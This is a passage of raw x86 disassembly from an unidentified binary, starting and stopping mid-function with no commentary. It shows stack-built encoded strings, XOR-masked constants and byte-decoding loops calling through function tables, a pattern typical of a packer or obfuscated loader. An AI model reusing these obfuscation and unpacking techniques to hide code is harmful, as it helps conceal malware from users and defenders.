  425d35:	mov    edx,DWORD PTR [edx+0x18c]
  425d3b:	mov    edx,DWORD PTR [edx]
  425d3d:	add    edx,DWORD PTR [eax+0x88]
  425d43:	push   0x4
  425d45:	push   DWORD PTR [eax+0x8c]
  425d4b:	push   edx
  425d4c:	call   DWORD PTR [ecx+0x1c]
  425d4f:	push   DWORD PTR [ebp+0x8]
  425d52:	xor    eax,eax
  425d54:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e34
  425d5e:	mov    DWORD PTR [ebp-0xa4],0x12370d1c
  425d68:	mov    DWORD PTR [ebp-0xa0],0x3c0d180a
  425d72:	mov    BYTE PTR [ebp-0x9c],0x83
  425d79:	lea    edi,[ebp-0x9b]
  425d7f:	stos   DWORD PTR es:[edi],eax
  425d80:	stos   WORD PTR es:[edi],ax
  425d82:	stos   BYTE PTR es:[edi],al
  425d83:	xor    eax,eax
  425d85:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e34
  425d8f:	mov    DWORD PTR [ebp-0xb8],0x12370d1c
  425d99:	mov    DWORD PTR [ebp-0xb4],0x2a0d180a
  425da3:	mov    BYTE PTR [ebp-0xb0],0x83
  425daa:	lea    edi,[ebp-0xaf]
  425db0:	stos   DWORD PTR es:[edi],eax
  425db1:	stos   WORD PTR es:[edi],ax
  425db3:	stos   BYTE PTR es:[edi],al
  425db4:	mov    edi,DWORD PTR [ebp+0x8]
  425db7:	mov    eax,DWORD PTR [ebp+0x8]
  425dba:	mov    edx,DWORD PTR [eax+0x1b8]
  425dc0:	mov    DWORD PTR [ebp-0x68],0xd0f0e17
  425dc7:	mov    DWORD PTR [ebp-0x64],0x1413101e
  425dce:	mov    WORD PTR [ebp-0x60],0x833c
  425dd4:	mov    DWORD PTR [ebp-0x90],0x1b3e0e34
  425dde:	mov    DWORD PTR [ebp-0x8c],0x173c0d1c
  425de8:	mov    DWORD PTR [ebp-0x88],0x311c1b13
  425df2:	mov    DWORD PTR [ebp-0x84],0xd181008
  425dfc:	mov    DWORD PTR [ebp-0x80],0x833c1e14
  425e03:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e34
  425e0a:	mov    DWORD PTR [ebp-0x78],0x173c0d1c
  425e11:	mov    DWORD PTR [ebp-0x74],0x311c1b13
  425e18:	mov    DWORD PTR [ebp-0x70],0xd181008
  425e1f:	mov    DWORD PTR [ebp-0x6c],0x832a1e14
  425e26:	call   0x42811b
  425e2b:	push   eax
  425e2c:	mov    eax,DWORD PTR [ebp+0x8]
  425e2f:	mov    eax,DWORD PTR [eax+0x1a8]
  425e35:	push   DWORD PTR [eax]
  425e37:	call   0x427dbc
  425e3c:	test   eax,eax
  425e3e:	jne    0x425e90
  425e40:	mov    eax,DWORD PTR [ebp+0x8]
  425e43:	mov    eax,DWORD PTR [eax+0x1e0]
  425e49:	mov    edi,DWORD PTR [ebp+0x8]
  425e4c:	add    eax,0x4
  425e4f:	mov    DWORD PTR [ebp-0x20],eax
  425e52:	mov    eax,DWORD PTR [ebp+0x8]
  425e55:	mov    edx,DWORD PTR [eax+0x1b8]
  425e5b:	call   0x42811b
  425e60:	push   eax
  425e61:	mov    eax,DWORD PTR [ebp-0x20]
  425e64:	call   DWORD PTR [eax]
  425e66:	test   eax,eax
  425e68:	jne    0x425e90
  425e6a:	mov    eax,DWORD PTR [ebp+0x8]
  425e6d:	mov    eax,DWORD PTR [eax+0x1e0]
  425e73:	mov    edi,DWORD PTR [ebp+0x8]
  425e76:	add    eax,0x10
  425e79:	mov    DWORD PTR [ebp-0x20],eax
  425e7c:	mov    eax,DWORD PTR [ebp+0x8]
  425e7f:	mov    edx,DWORD PTR [eax+0x1b8]
  425e85:	call   0x42811b
  425e8a:	push   eax
  425e8b:	mov    eax,DWORD PTR [ebp-0x20]
  425e8e:	call   DWORD PTR [eax]
  425e90:	mov    eax,DWORD PTR [ebp-0x10]
  425e93:	mov    ecx,DWORD PTR [ebp-0x28]
  425e96:	xor    eax,ebx
  425e98:	add    eax,esi
  425e9a:	cmp    eax,ecx
  425e9c:	je     0x42605f
  425ea2:	mov    eax,DWORD PTR [ebp-0x18]
  425ea5:	xor    eax,ebx
  425ea7:	mov    ecx,0xffcd8d0f
  425eac:	sub    ecx,eax
  425eae:	add    ecx,DWORD PTR [ebp-0x28]
  425eb1:	mov    eax,DWORD PTR [ebp-0x1c]
  425eb4:	cmp    eax,ecx
  425eb6:	ja     0x42605f
  425ebc:	mov    DWORD PTR [ebp-0x34],0x0
  425ec3:	push   DWORD PTR [ebp+0x8]
  425ec6:	mov    edi,DWORD PTR [ebp+0x8]
  425ec9:	mov    eax,DWORD PTR [ebp+0x8]
  425ecc:	mov    edx,DWORD PTR [eax+0x1b4]
  425ed2:	call   0x42811b
  425ed7:	push   eax
  425ed8:	mov    eax,DWORD PTR [ebp+0x8]
  425edb:	mov    eax,DWORD PTR [eax+0x1a8]
  425ee1:	push   DWORD PTR [eax]
  425ee3:	call   0x427dbc
  425ee8:	mov    ecx,DWORD PTR [ebp+0x8]
  425eeb:	mov    ecx,DWORD PTR [ecx+0x19c]
  425ef1:	mov    DWORD PTR [ecx],eax
  425ef3:	mov    eax,DWORD PTR [ebp+0x8]
  425ef6:	mov    edi,DWORD PTR [eax+0x1e0]
  425efc:	mov    esi,DWORD PTR [ebp+0x8]
  425eff:	xor    eax,eax
  425f01:	lea    edx,[ebp-0x7c]
  425f04:	call   0x428151
  425f09:	push   eax
  425f0a:	mov    eax,DWORD PTR [ebp+0x8]
  425f0d:	mov    eax,DWORD PTR [eax+0x19c]
  425f13:	push   DWORD PTR [eax]
  425f15:	call   DWORD PTR [edi+0x8]
  425f18:	mov    DWORD PTR [ebp-0x20],eax
  425f1b:	mov    eax,DWORD PTR [ebp+0x8]
  425f1e:	mov    edi,DWORD PTR [eax+0x1e0]
  425f24:	mov    esi,DWORD PTR [ebp+0x8]
  425f27:	xor    eax,eax
  425f29:	lea    edx,[ebp-0x90]
  425f2f:	call   0x428151
  425f34:	push   eax
  425f35:	mov    eax,DWORD PTR [ebp+0x8]
  425f38:	mov    eax,DWORD PTR [eax+0x19c]
  425f3e:	push   DWORD PTR [eax]
  425f40:	call   DWORD PTR [edi+0x8]
  425f43:	mov    eax,DWORD PTR [ebp+0x8]
  425f46:	mov    edi,DWORD PTR [eax+0x1e0]
  425f4c:	mov    esi,DWORD PTR [ebp+0x8]
  425f4f:	xor    eax,eax
  425f51:	lea    edx,[ebp-0xa8]
  425f57:	call   0x428151
  425f5c:	push   eax
  425f5d:	mov    eax,DWORD PTR [ebp+0x8]
  425f60:	mov    eax,DWORD PTR [eax+0x19c]
  425f66:	push   DWORD PTR [eax]
  425f68:	call   DWORD PTR [edi+0x8]
  425f6b:	and    DWORD PTR [ebp-0x8],0x0
  425f6f:	mov    DWORD PTR [ebp-0x48],eax
  425f72:	mov    eax,DWORD PTR [ebp-0x8]
  425f75:	and    eax,0x7
  425f78:	add    eax,0x31
  425f7b:	push   eax
  425f7c:	call   DWORD PTR [ebp-0x20]
  425f7f:	test   eax,eax
  425f81:	je     0x425fc5
  425f83:	mov    eax,DWORD PTR [ebp-0x8]
  425f86:	push   0x19
  425f88:	xor    edx,edx
  425f8a:	pop    ecx
  425f8b:	div    ecx
  425f8d:	add    dl,0x41
  425f90:	movzx  eax,dl
  425f93:	push   eax
  425f94:	call   DWORD PTR [ebp-0x48]
  425f97:	test   eax,eax
  425f99:	jne    0x425fc5
  425f9b:	mov    eax,DWORD PTR [ebp+0x8]
  425f9e:	mov    edi,DWORD PTR [eax+0x1e0]
  425fa4:	mov    esi,DWORD PTR [ebp+0x8]
  425fa7:	xor    eax,eax
  425fa9:	lea    edx,[ebp-0x68]
  425fac:	call   0x428151
  425fb1:	push   eax
  425fb2:	mov    eax,DWORD PTR [ebp+0x8]
  425fb5:	mov    eax,DWORD PTR [eax+0x198]
  425fbb:	push   DWORD PTR [eax]
  425fbd:	call   DWORD PTR [edi+0x8]
  425fc0:	mov    DWORD PTR [ebp-0x14],eax
  425fc3:	jmp    0x425fc9
  425fc5:	and    DWORD PTR [ebp-0x14],0x0
  425fc9:	inc    DWORD PTR [ebp-0x8]
  425fcc:	cmp    DWORD PTR [ebp-0x8],0x10
  425fd0:	jb     0x425f72
  425fd2:	mov    eax,DWORD PTR [ebp-0x18]
  425fd5:	mov    esi,DWORD PTR [ebp+0x8]
  425fd8:	xor    eax,ebx
  425fda:	mov    edi,0x3272f1
  425fdf:	add    eax,edi
  425fe1:	lea    edx,[ebp-0x10c]
  425fe7:	call   0x428151
  425fec:	push   eax
  425fed:	mov    eax,DWORD PTR [ebp-0x10]
  425ff0:	mov    esi,DWORD PTR [ebp+0x8]
  425ff3:	xor    eax,ebx
  425ff5:	add    eax,edi
  425ff7:	lea    edx,[ebp-0x12c]
  425ffd:	call   0x428151
  426002:	push   eax
  426003:	call   DWORD PTR [ebp-0x14]
  426006:	mov    ecx,DWORD PTR [ebp-0x10]
  426009:	xor    ecx,ebx
  42600b:	add    ecx,edi
  42600d:	cmp    ecx,eax
  42600f:	jne    0x426018
  426011:	mov    DWORD PTR [ebp-0x34],0x1
  426018:	mov    eax,DWORD PTR [ebp-0x18]
  42601b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42601e:	xor    eax,ebx
  426020:	lea    eax,[eax+ecx*1+0x3272f1]
  426027:	mov    DWORD PTR [ebp-0x1c],eax
  42602a:	mov    eax,DWORD PTR [ebp-0x34]
  42602d:	test   eax,eax
  42602f:	je     0x426043
  426031:	mov    eax,DWORD PTR [ebp-0x18]
  426034:	mov    ecx,DWORD PTR [ebp-0x38]
  426037:	xor    eax,ebx
  426039:	lea    eax,[eax+ecx*1+0x3272f1]
  426040:	mov    DWORD PTR [ebp-0x38],eax
  426043:	mov    eax,DWORD PTR [ebp-0x18]
  426046:	xor    eax,ebx
  426048:	mov    ecx,0xffcd8d0f
  42604d:	sub    ecx,eax
  42604f:	add    ecx,DWORD PTR [ebp-0x28]
  426052:	mov    eax,DWORD PTR [ebp-0x1c]
  426055:	cmp    eax,ecx
  426057:	jbe    0x425ebc
  42605d:	mov    esi,edi
  42605f:	mov    eax,DWORD PTR [ebp-0x38]
  426062:	mov    ecx,DWORD PTR [ebp-0x1c]
  426065:	cmp    ecx,eax
  426067:	jne    0x42607a
  426069:	push   DWORD PTR [ebp+0x8]
  42606c:	lea    eax,[ebp-0x40]
  42606f:	push   eax
  426070:	call   0x428bbe
  426075:	mov    DWORD PTR [ebp-0x24],eax
  426078:	jmp    0x426086
  42607a:	mov    eax,DWORD PTR [ebp-0x24]
  42607d:	mov    ecx,DWORD PTR [ebp-0x18]
  426080:	xor    ecx,ebx
  426082:	add    ecx,esi
  426084:	xor    DWORD PTR [eax],ecx
  426086:	mov    eax,DWORD PTR [ebp-0x10]
  426089:	mov    ecx,DWORD PTR [ebp-0x24]
  42608c:	xor    eax,ebx
  42608e:	add    eax,esi
  426090:	cmp    eax,ecx
  426092:	je     0x426809
  426098:	mov    eax,DWORD PTR [ebp-0x10]
  42609b:	mov    ecx,DWORD PTR [ebp-0x40]
  42609e:	xor    eax,ebx
  4260a0:	add    eax,esi
  4260a2:	cmp    eax,ecx
  4260a4:	je     0x426809
  4260aa:	mov    eax,DWORD PTR [ebp-0x10]
  4260ad:	xor    eax,ebx
  4260af:	add    eax,esi
  4260b1:	jmp    0x4260cf
  4260b3:	mov    edi,DWORD PTR [ebp-0x24]
  4260b6:	mov    cl,al
  4260b8:	and    cl,0x1f
  4260bb:	or     dl,0xff
  4260be:	sub    dl,cl
  4260c0:	add    BYTE PTR [edi+eax*1],dl
  4260c3:	mov    ecx,DWORD PTR [ebp-0x18]
  4260c6:	xor    ecx,ebx
  4260c8:	lea    eax,[eax+ecx*1+0x3272f1]
  4260cf:	mov    ecx,DWORD PTR [ebp-0x40]
  4260d2:	cmp    eax,ecx
  4260d4:	jb     0x4260b3
  4260d6:	mov    eax,DWORD PTR [ebp-0x40]
  4260d9:	mov    DWORD PTR [ebp-0x28],eax
  4260dc:	mov    eax,DWORD PTR [ebp-0x24]
  4260df:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  4260e6:	mov    DWORD PTR [ebp-0xd4],eax
  4260ec:	mov    edi,0xf89c85ba
  4260f1:	mov    DWORD PTR [ebp-0x2c],edi
  4260f4:	mov    eax,DWORD PTR [ebp-0x38]
  4260f7:	xor    eax,ebx
  4260f9:	add    eax,esi
  4260fb:	mov    DWORD PTR [ebp-0xc],eax
  4260fe:	mov    eax,DWORD PTR [ebp-0x38]
  426101:	xor    eax,ebx
  426103:	add    eax,esi
  426105:	mov    DWORD PTR [ebp-0x8],eax
  426108:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  42610f:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  426116:	mov    eax,DWORD PTR [ebp-0x38]
  426119:	mov    ecx,DWORD PTR [ebp-0x28]
  42611c:	xor    eax,ebx
  42611e:	add    eax,esi
  426120:	cmp    ecx,eax
  426122:	je     0x426321
  426128:	jmp    0x4262fd
  42612d:	mov    ecx,DWORD PTR [ebp-0xc]
  426130:	mov    eax,DWORD PTR [ebp-0x28]
  426133:	sub    eax,ecx
  426135:	mov    ecx,DWORD PTR [ebp-0x48]
  426138:	xor    ecx,ebx
  42613a:	add    ecx,esi
  42613c:	xor    edx,edx
  42613e:	div    ecx
  426140:	mov    DWORD PTR [ebp-0x8],eax
  426143:	mov    eax,DWORD PTR [ebp-0x4c]
  426146:	mov    ecx,DWORD PTR [ebp-0x8]
  426149:	xor    eax,ebx
  42614b:	add    eax,esi
  42614d:	cmp    ecx,eax
  42614f:	jbe    0x42615b
  426151:	mov    eax,DWORD PTR [ebp-0x4c]
  426154:	xor    eax,ebx
  426156:	add    eax,esi
  426158:	mov    DWORD PTR [ebp-0x8],eax
  42615b:	mov    eax,DWORD PTR [ebp-0x48]
  42615e:	mov    ecx,DWORD PTR [ebp-0x8]
  426161:	xor    eax,ebx
  426163:	add    eax,esi
  426165:	imul   eax,ecx
  426168:	mov    DWORD PTR [ebp-0x8],eax
  42616b:	mov    eax,DWORD PTR [ebp-0x38]
  42616e:	mov    ecx,DWORD PTR [ebp-0x8]
  426171:	xor    eax,ebx
  426173:	add    eax,esi
  426175:	cmp    ecx,eax
  426177:	je     0x4262eb
  42617d:	mov    eax,DWORD PTR [ebp-0x8]
  426180:	mov    DWORD PTR [ebp-0x14],eax
  426183:	mov    eax,DWORD PTR [ebp-0xc]
  426186:	add    eax,DWORD PTR [ebp-0xd4]
  42618c:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  426193:	mov    DWORD PTR [ebp-0x34],edi
  426196:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  4261a0:	mov    DWORD PTR [ebp-0x8],eax
  4261a3:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  4261aa:	mov    DWORD PTR [ebp-0x1c],edi
  4261ad:	mov    eax,DWORD PTR [ebp-0x20]
  4261b0:	xor    eax,ebx
  4261b2:	add    eax,esi
  4261b4:	jmp    0x4262aa
  4261b9:	mov    DWORD PTR [ebp-0xe0],0xf89c85b0
  4261c3:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  4261cd:	mov    eax,DWORD PTR [ebp-0x1c]
  4261d0:	mov    ecx,DWORD PTR [ebp-0x44]
  4261d3:	xor    eax,ebx
  4261d5:	add    eax,esi
  4261d7:	imul   eax,ecx
  4261da:	mov    ecx,DWORD PTR [ebp-0x8]
  4261dd:	mov    al,BYTE PTR [eax+ecx*1]
  4261e0:	mov    BYTE PTR [ebp-0x2],al
  4261e3:	mov    eax,DWORD PTR [ebp-0x1c]
  4261e6:	mov    ecx,DWORD PTR [ebp-0x44]
  4261e9:	xor    eax,ebx
  4261eb:	add    eax,esi
  4261ed:	imul   eax,ecx
  4261f0:	mov    ecx,DWORD PTR [ebp-0xe8]
  4261f6:	xor    ecx,ebx
  4261f8:	add    eax,ecx
  4261fa:	mov    ecx,DWORD PTR [ebp-0x8]
  4261fd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426205:	mov    ecx,DWORD PTR [ebp-0xe0]
  42620b:	xor    ecx,ebx
  42620d:	lea    eax,[ecx+eax*1+0x3272f1]
  426214:	movzx  ecx,BYTE PTR [ebp-0x2]
  426218:	xor    ecx,eax
  42621a:	mov    BYTE PTR [ebp-0x2],cl
  42621d:	mov    al,BYTE PTR [ebp-0x2]
  426220:	mov    ecx,DWORD PTR [ebp-0x1c]
  426223:	mov    edx,DWORD PTR [ebp-0x44]
  426226:	xor    ecx,ebx
  426228:	add    ecx,esi
  42622a:	imul   ecx,edx
  42622d:	mov    edx,DWORD PTR [ebp-0x8]
  426230:	mov    BYTE PTR [ecx+edx*1],al
  426233:	mov    eax,DWORD PTR [ebp-0x1c]
  426236:	mov    ecx,DWORD PTR [ebp-0x44]
  426239:	xor    eax,ebx
  42623b:	add    eax,esi
  42623d:	imul   eax,ecx
  426240:	mov    ecx,DWORD PTR [ebp-0x8]
  426243:	mov    al,BYTE PTR [eax+ecx*1]
  426246:	mov    BYTE PTR [ebp-0x2],al
  426249:	mov    eax,DWORD PTR [ebp-0x1c]
  42624c:	mov    ecx,DWORD PTR [ebp-0x44]
  42624f:	xor    eax,ebx
  426251:	add    eax,esi
  426253:	imul   eax,ecx
  426256:	mov    ecx,DWORD PTR [ebp-0x34]
  426259:	xor    ecx,ebx
  42625b:	add    eax,ecx
  42625d:	mov    ecx,DWORD PTR [ebp-0x8]
  426260:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426268:	mov    ecx,DWORD PTR [ebp-0xc4]
  42626e:	xor    ecx,ebx
  426270:	lea    eax,[ecx+eax*1+0x3272f1]
  426277:	movzx  ecx,BYTE PTR [ebp-0x2]
  42627b:	xor    ecx,eax
  42627d:	mov    BYTE PTR [ebp-0x2],cl
  426280:	mov    al,BYTE PTR [ebp-0x2]
  426283:	mov    ecx,DWORD PTR [ebp-0x1c]
  426286:	mov    edx,DWORD PTR [ebp-0x44]
  426289:	xor    ecx,ebx
  42628b:	add    ecx,esi
  42628d:	imul   ecx,edx
  426290:	mov    edx,DWORD PTR [ebp-0x8]
  426293:	mov    BYTE PTR [ecx+edx*1],al
  426296:	mov    eax,DWORD PTR [ebp-0x30]
  426299:	mov    ecx,DWORD PTR [ebp-0x34]
  42629c:	xor    eax,ebx
  42629e:	xor    ecx,ebx
  4262a0:	add    eax,esi
  4262a2:	add    ecx,esi
  4262a4:	imul   eax,ecx
  4262a7:	add    eax,DWORD PTR [ebp-0x44]
  4262aa:	mov    DWORD PTR [ebp-0x44],eax
  4262ad:	mov    eax,DWORD PTR [ebp-0x44]
  4262b0:	mov    ecx,DWORD PTR [ebp-0x14]
  4262b3:	cmp    ecx,eax
  4262b5:	jb     0x4261b9
  4262bb:	mov    eax,DWORD PTR [ebp-0x34]
  4262be:	mov    ecx,DWORD PTR [ebp-0x14]
  4262c1:	xor    eax,ebx
  4262c3:	add    eax,esi
  4262c5:	imul   eax,ecx
  4262c8:	mov    ecx,DWORD PTR [ebp-0x20]
  4262cb:	xor    ecx,ebx
  4262cd:	add    ecx,esi
  4262cf:	or     eax,ecx
  4262d1:	mov    ecx,DWORD PTR [ebp-0x2c]
  4262d4:	xor    ecx,ebx
  4262d6:	add    eax,ecx
  4262d8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4262db:	xor    ecx,ebx
  4262dd:	add    eax,ecx
  4262df:	mov    ecx,DWORD PTR [ebp-0xc]
  4262e2:	lea    eax,[eax+ecx*1+0x64e5e2]
  4262e9:	jmp    0x4262fa
  4262eb:	mov    eax,DWORD PTR [ebp-0x2c]
  4262ee:	mov    ecx,DWORD PTR [ebp-0xc]
  4262f1:	xor    eax,ebx
  4262f3:	lea    eax,[eax+ecx*1+0x3272f1]
  4262fa:	mov    DWORD PTR [ebp-0xc],eax
  4262fd:	mov    eax,DWORD PTR [ebp-0x2c]
  426300:	xor    eax,ebx
  426302:	mov    ecx,0xffcd8d0f
  426307:	sub    ecx,eax
  426309:	add    ecx,DWORD PTR [ebp-0x28]
  42630c:	mov    eax,DWORD PTR [ebp-0x2c]
  42630f:	mov    edx,DWORD PTR [ebp-0xc]
  426312:	xor    eax,ebx
  426314:	add    eax,esi
  426316:	imul   eax,edx
  426319:	cmp    eax,ecx
  42631b:	jbe    0x42612d
  426321:	mov    eax,DWORD PTR [ebp-0x10]
  426324:	mov    ecx,DWORD PTR [ebp-0x40]
  426327:	mov    eax,DWORD PTR [ebp+0x8]
  42632a:	mov    edx,DWORD PTR [ebp-0x54]
  42632d:	mov    eax,DWORD PTR [eax+0x1e0]
  426333:	xor    edx,ebx
  426335:	add    edx,esi
  426337:	push   edx
  426338:	mov    edx,DWORD PTR [ebp-0x3c]
  42633b:	xor    edx,ebx
  42633d:	add    edx,esi
  42633f:	push   edx
  426340:	push   ecx
  426341:	mov    DWORD PTR [ebp-0x30],ecx
  426344:	mov    ecx,DWORD PTR [ebp-0x10]
  426347:	xor    ecx,ebx
  426349:	add    ecx,esi
  42634b:	push   ecx
  42634c:	call   DWORD PTR [eax+0x14]
  42634f:	mov    edi,eax
  426351:	mov    eax,DWORD PTR [ebp-0x10]
  426354:	xor    eax,ebx
  426356:	add    eax,esi
  426358:	cmp    eax,edi
  42635a:	je     0x4263b5
  42635c:	mov    eax,DWORD PTR [ebp-0x10]
  42635f:	jmp    0x426382
  426361:	mov    ecx,DWORD PTR [ebp-0x24]
  426364:	xor    eax,ebx
  426366:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f1]
  42636d:	mov    BYTE PTR [eax+edi*1+0x3272f1],cl
  426374:	mov    ecx,DWORD PTR [ebp-0x18]
  426377:	xor    ecx,ebx
  426379:	lea    eax,[ecx+eax*1+0x3272f1]
  426380:	xor    eax,ebx
  426382:	mov    ecx,DWORD PTR [ebp-0x40]
  426385:	sub    ecx,esi
  426387:	xor    ecx,ebx
  426389:	cmp    eax,ecx
  42638b:	jne    0x426361
  42638d:	mov    eax,DWORD PTR [ebp+0x8]
  426390:	mov    ecx,DWORD PTR [ebp-0x50]
  426393:	mov    eax,DWORD PTR [eax+0x1e0]
  426399:	xor    ecx,ebx
  42639b:	add    ecx,esi
  42639d:	push   ecx
  42639e:	mov    ecx,DWORD PTR [ebp-0x10]
  4263a1:	xor    ecx,ebx
  4263a3:	add    ecx,esi
  4263a5:	push   ecx
  4263a6:	push   DWORD PTR [ebp-0x24]
  4263a9:	call   DWORD PTR [eax+0x18]
  4263ac:	mov    eax,DWORD PTR [ebp-0x30]
  4263af:	mov    DWORD PTR [ebp-0x24],edi
  4263b2:	mov    DWORD PTR [ebp-0x40],eax
  4263b5:	mov    edi,DWORD PTR [ebp-0x24]
  4263b8:	mov    eax,DWORD PTR [ebp-0x18]
  4263bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4263be:	xor    eax,ebx
  4263c0:	mov    DWORD PTR [ebp-0x30],edi
  4263c3:	add    eax,esi
  4263c5:	mov    DWORD PTR [ebp-0x5c],0x3c2b332b
  4263cc:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
  4263d3:	jmp    0x426406
  4263d5:	xor    ecx,ebx
  4263d7:	mov    dl,BYTE PTR [ebp+ecx*1+0x327295]
  4263de:	xor    dl,0x7c
  4263e1:	inc    dl
  4263e3:	mov    DWORD PTR [ebp-0x3c],ecx
  4263e6:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f1]
  4263ee:	movzx  edx,dl
  4263f1:	cmp    ecx,edx
  4263f3:	jne    0x426410
  4263f5:	mov    ecx,DWORD PTR [ebp-0x18]
  4263f8:	mov    edx,DWORD PTR [ebp-0x3c]
  4263fb:	xor    ecx,ebx
  4263fd:	lea    ecx,[ecx+edx*1+0x3272f1]
  426404:	xor    ecx,ebx
  426406:	cmp    ecx,0xf89c85bd
  42640c:	jne    0x4263d5
  42640e:	jmp    0x426417
  426410:	mov    eax,DWORD PTR [ebp-0x10]
  426413:	xor    eax,ebx
  426415:	add    eax,esi
  426417:	mov    ecx,DWORD PTR [ebp-0x10]
  42641a:	xor    ecx,ebx
  42641c:	add    ecx,esi
  42641e:	cmp    ecx,eax
  426420:	je     0x426593
  426426:	mov    eax,DWORD PTR [edi+0x8]
  426429:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426430:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  426437:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  42643e:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  426445:	mov    DWORD PTR [ebp-0x14],eax
  426448:	mov    eax,DWORD PTR [ebp+0x8]
  42644b:	mov    ecx,DWORD PTR [ebp-0x20]
  42644e:	xor    ecx,ebx
  426450:	add    ecx,esi
  426452:	push   ecx
  426453:	mov    ecx,DWORD PTR [ebp-0x48]
  426456:	mov    eax,DWORD PTR [eax+0x1e0]
  42645c:	xor    ecx,ebx
  42645e:	add    ecx,esi
  426460:	push   ecx
  426461:	mov    ecx,DWORD PTR [ebp-0x3c]
  426464:	xor    ecx,ebx
  426466:	add    ecx,esi
  426468:	push   ecx
  426469:	mov    ecx,DWORD PTR [ebp-0xc]
  42646c:	xor    ecx,ebx
  42646e:	add    ecx,esi
  426470:	push   ecx
  426471:	call   DWORD PTR [eax+0x14]
  426474:	mov    edi,eax
  426476:	mov    eax,DWORD PTR [ebp+0x8]
  426479:	mov    ecx,DWORD PTR [ebp-0x20]
  42647c:	mov    eax,DWORD PTR [eax+0x1e0]
  426482:	xor    ecx,ebx
  426484:	add    ecx,esi
  426486:	push   ecx
  426487:	mov    ecx,DWORD PTR [ebp-0x48]
  42648a:	xor    ecx,ebx
  42648c:	add    ecx,esi
  42648e:	push   ecx
  42648f:	mov    ecx,DWORD PTR [ebp-0xc]
  426492:	push   DWORD PTR [ebp-0x14]
  426495:	xor    ecx,ebx
  426497:	add    ecx,esi
  426499:	push   ecx
  42649a:	call   DWORD PTR [eax+0x14]
  42649d:	mov    ecx,DWORD PTR [ebp-0xc]
  4264a0:	xor    ecx,ebx
  4264a2:	add    ecx,esi
  4264a4:	mov    DWORD PTR [ebp-0x20],eax
  4264a7:	cmp    ecx,edi
  4264a9:	je     0x426836
  4264af:	mov    ecx,DWORD PTR [ebp-0xc]
  4264b2:	xor    ecx,ebx
  4264b4:	add    ecx,esi
  4264b6:	cmp    ecx,eax
  4264b8:	je     0x426836
  4264be:	mov    DWORD PTR [ebp-0x3c],0xf89c85b8
  4264c5:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  4264cc:	mov    ecx,DWORD PTR [ebp-0x3c]
  4264cf:	xor    cl,0xaa
  4264d2:	sub    cl,0xf
  4264d5:	mov    BYTE PTR [edi],cl
  4264d7:	mov    ecx,DWORD PTR [ebp-0xc]
  4264da:	xor    cl,0xaa
  4264dd:	sub    cl,0xf
  4264e0:	mov    BYTE PTR [edi+0x1],cl
  4264e3:	mov    ecx,DWORD PTR [ebp-0x54]
  4264e6:	xor    cl,0xaa
  4264e9:	sub    cl,0xf
  4264ec:	mov    BYTE PTR [edi+0x2],cl
  4264ef:	and    DWORD PTR [ebp-0xc8],0x0
  4264f6:	and    DWORD PTR [ebp-0xdc],0x0
  4264fd:	lea    ecx,[ebp-0xdc]
  426503:	push   ecx
  426504:	push   DWORD PTR [ebp-0x14]
  426507:	push   eax
  426508:	lea    eax,[ebp-0xc8]
  42650e:	push   eax
  42650f:	mov    eax,DWORD PTR [ebp-0x30]
  426512:	push   DWORD PTR [eax+0xc]
  426515:	mov    eax,DWORD PTR [ebp-0x24]
  426518:	add    eax,0x10
  42651b:	push   eax
  42651c:	push   edi
  42651d:	call   0x4257c4
  426522:	mov    DWORD PTR [ebp-0x3c],eax
  426525:	mov    eax,DWORD PTR [ebp+0x8]
  426528:	mov    ecx,DWORD PTR [ebp-0x50]
  42652b:	mov    eax,DWORD PTR [eax+0x1e0]
  426531:	xor    ecx,ebx
  426533:	add    ecx,esi
  426535:	push   ecx
  426536:	mov    ecx,DWORD PTR [ebp-0xc]
  426539:	xor    ecx,ebx
  42653b:	add    ecx,esi
  42653d:	push   ecx
  42653e:	push   edi
  42653f:	call   DWORD PTR [eax+0x18]
  426542:	mov    eax,DWORD PTR [ebp-0x3c]
  426545:	add    eax,0xffcd8d0f
  42654a:	xor    eax,ebx
  42654c:	cmp    eax,0xf89c85a5
  426551:	mov    eax,DWORD PTR [ebp+0x8]
  426554:	mov    eax,DWORD PTR [eax+0x1e0]
  42655a:	mov    ecx,DWORD PTR [ebp-0x50]
  42655d:	jne    0x426580
  42655f:	xor    ecx,ebx
  426561:	add    ecx,esi
  426563:	push   ecx
  426564:	mov    ecx,DWORD PTR [ebp-0xc]
  426567:	xor    ecx,ebx
  426569:	add    ecx,esi
  42656b:	push   ecx
  42656c:	push   DWORD PTR [ebp-0x24]
  42656f:	call   DWORD PTR [eax+0x18]
  426572:	mov    eax,DWORD PTR [ebp-0x20]
  426575:	mov    DWORD PTR [ebp-0x24],eax
  426578:	mov    eax,DWORD PTR [ebp-0x14]
  42657b:	mov    DWORD PTR [ebp-0x40],eax
  42657e:	jmp    0x426593
  426580:	xor    ecx,ebx
  426582:	add    ecx,esi
  426584:	push   ecx
  426585:	mov    ecx,DWORD PTR [ebp-0xc]
  426588:	xor    ecx,ebx
  42658a:	add    ecx,esi
  42658c:	push   ecx
  42658d:	push   DWORD PTR [ebp-0x20]
  426590:	call   DWORD PTR [eax+0x18]
  426593:	mov    eax,DWORD PTR [ebp-0x40]
  426596:	mov    DWORD PTR [ebp-0x38],eax
  426599:	mov    eax,DWORD PTR [ebp-0x24]
  42659c:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
